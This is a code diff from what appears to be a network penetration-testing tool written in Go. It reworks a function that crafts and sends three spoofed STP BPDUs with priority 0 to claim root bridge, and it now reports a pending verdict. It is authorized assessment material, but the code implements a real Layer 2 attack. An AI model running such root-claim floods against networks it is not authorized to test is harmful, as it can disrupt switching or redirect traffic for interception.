@@ -14,7 +14,6 @@ import (
 	"encoding/binary"
 	"encoding/json"
 	"net"
-	"time"
 
 	"github.com/gopacket/gopacket"
 	"github.com/gopacket/gopacket/layers"
@@ -22,7 +21,7 @@ import (
 	"go.aledante.io/FlowSeer/src/common/errs"
 
 	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
-	"go.aledante.io/FlowSeer/src/edge/netpen/runner"
+	"go.aledante.io/FlowSeer/src/edge/netpen/check"
 )
 
 type stpRootFinding struct {
@@ -32,10 +31,13 @@ type stpRootFinding struct {
 	BurstCount   int    `json:"burst_count"`
 }
 
-// RunSTPRoot sends superior BPDUs to claim STP root. The burst count is
-// bounded by the rate and a short duration; the behavior is transient-decay.
-func RunSTPRoot(ctx context.Context, deps runner.Deps) error {
-	src := srcMAC(deps)
+// RunSTPRoot sends three superior BPDUs claiming root with the attack
+// leg's MAC as the bridge identity. The behavior reads no target: the
+// timers and priority are probe content. The runner's paced leg spaces
+// the sends. The verdict is pending: whether the fabric accepted
+// the root needs a BPDU listener it does not have.
+func RunSTPRoot(ctx context.Context, deps check.Deps) (check.Verdict, error) {
+	src := deps.AttackLeg.Addr().MAC
 
 	rootPriority := uint16(0)
 	maxAge := uint16(20)
@@ -43,27 +45,17 @@ func RunSTPRoot(ctx context.Context, deps runner.Deps) error {
 	forwardDelay := uint16(2)
 	msgAge := uint16(15)
 
-	// Pre-serialize the BPDU once; the flood path sends it repeatedly
+	// Serialize the BPDU once so the flood path can send it repeatedly
 	// from the pooled buffer.
 	bpduPkt, err := craftSTPBPDU(src, rootPriority, maxAge, helloTime, forwardDelay, msgAge)
 	if err != nil {
-		return errs.Wrap(err, "stproot: craft BPDU")
+		return check.Verdict{}, errs.Wrap(err, "stproot: craft BPDU")
 	}
 
-	// Send a bounded burst of BPDUs. The baseline sends continuously;
-	// the behavior sends a fixed number for the in-memory test shape.
 	burstCount := 3
 	for i := 0; i < burstCount; i++ {
 		if err := deps.AttackLeg.Send(ctx, bpduPkt); err != nil {
-			return errs.Wrapf(err, "stproot: send BPDU %d", i)
-		}
-		// Honor rate if set; otherwise no delay.
-		if deps.Rate > 0 {
-			select {
-			case <-ctx.Done():
-				return ctx.Err()
-			case <-time.After(time.Second / time.Duration(deps.Rate)):
-			}
+			return check.Verdict{}, errs.Wrapf(err, "stproot: send BPDU %d", i)
 		}
 	}
 
@@ -75,7 +67,7 @@ func RunSTPRoot(ctx context.Context, deps runner.Deps) error {
 	})
 	deps.Emitter.Finding("stp", detail)
 
-	return nil
+	return check.Pending("no observable: root acceptance needs a BPDU listener"), nil
 }
 
 // craftSTPBPDU builds a Configuration BPDU: Ethernet → LLC(0x42/0x42/0x03) →
